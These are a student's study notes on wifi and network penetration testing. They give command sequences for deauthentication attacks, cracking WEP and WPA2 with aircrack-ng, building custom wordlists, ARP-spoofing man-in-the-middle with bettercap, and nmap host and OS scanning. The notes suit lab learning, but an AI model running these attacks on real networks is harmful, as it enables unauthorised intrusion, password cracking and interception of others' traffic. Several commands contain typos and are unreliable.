test: iwconfig on kali

to enable monitor mode
  manual:
    ifconfig wlan0 down
    iwconfig wlan0 mode monotor
    ifconfig wlan0 up
    iwconfig
  airmon-ng:
    airmon-ng start wlan0
    iwconfig

airodump-ng wlan0

airodump-ng --band abg wlan0mon // g for 5GHz where a and b for 2.4GHz // pause using space
defauthentication attack: attacker disconnects the router from the client and disconnects the client from the router
I select certain access point using tab, and color it using letter (maybe m)
airodump-ng --band abg -c 5 --bssid 04:.... wlan0
aireplay-ng --deauth 0 -a 04:5E... -c (victim mac) wlan0

hack web wifi:
airodump-ng --band abg wlan0mon
airodump-ng --band abg -c 5 --bssid 04:.... -w wep_hacking wlan0 // w to write result I am getting
keep first terminal
now have 2 new terminals
terminal 1:
aireplay-ng -- fakeauth 6000 -q 10 -o 1 -a 04:5E:A4:72:52:9F -e ETH -101 wlan0
terminal 2:
aireplay-ng --arpreplay -b 04:5E:A4:72:52:9F wlan0
keep them both running till the data reaches to 15000
now we need to crack the wifi:
aircrack-ng wep_hacking-01.cap

hack wpa2 brute force
airodump-ng --band abg -c 1 --bssid 08:5A:11:C1:A9:CA wlo1mon -w wpa_hacking
now do defauthentication attack for short period of time
WPA handshake: 08:5A:11:C1:A9:CA
aircrack-ng -w rockyou.txt /home/alihazimeh/Desktop/semsec-websecurity/wpa_hacking-01.cap

crunch, cewel, john the ripper // tools to generate my own wordlist
generate a file: add some info on separate lines // hasan, achek, 1999
john --wordlist=keywords.txt --rules --stdout > custom_wordlist.txt

ARP Protocol
message go to router, bob will ask all devices whether they are the router(looking for an ip address), the router will say she is the router giving you the mac address (same thing will happen between first and second router...)

I can tell people in the network that I am the router giving them my mac address to become man in the middle

bettercap: (man in the middle)
sudo bettercap
net.probe on
net.show
192.168.1.5, 192.168.1.8, 192.168.1.9
now on another terminal:
  sudo nmap -O 192.168.1.5 (gather information of the connected device)

// TODO, this didn't work
sudo bettercap -iface eth0 -caplet arp.cap
// arp.cap
  net.probe on
  set arp.spoof.fullduplex true
  set arp.spoof.targets victim ip addr, geteway
  arp.spoof on
  set net.sniff.local true
  net.sniff on

nmap -sn 192.168.1.0/24 // scan all hosts within the network to get up ips
I can also give it group of ips to scan
  echo "192.168.1.0/24/24" >ipsFile
  nmap -sn -iL ipsFile
sudo nmap -O 192.168.1.1,101,105 // know the os of these address and services they are using
nmap 192.168.1.101 // he got back all ports that exists on tcp with their services
  nmap by default looks for tcp ports and looks for the most popular 1000 ports
  sudo nmap -sU 192.168.1.101 // now it gives the udp ports only
-nmap could report to which service these ports probably corresponds to
  // for ezample port 80 probably corresponds to a web server
  nmap -sV 192.168.1.101

https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network
recommended books and articles:
The TCP/IP Guide: A Comprehensive, Illustrated Internet Protocols Reference: https://www.amazon.com/TCP-Guide-Comprehensive-Illustrated-Protocols/dp/159327047X/ref=sr_1_1?keywords=The+TCP_IP+Guide&qid=1695128933&s=books&sr=1-1
How exactly does 4-way handshake cracking work (theoretically)?
Advanced WIFI penetration Testing:https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi

https://www.youtube.com/watch?v=PG9oKZdFb7w
https://www.youtube.com/watch?v=JRVb-xE1zTI&t=1s
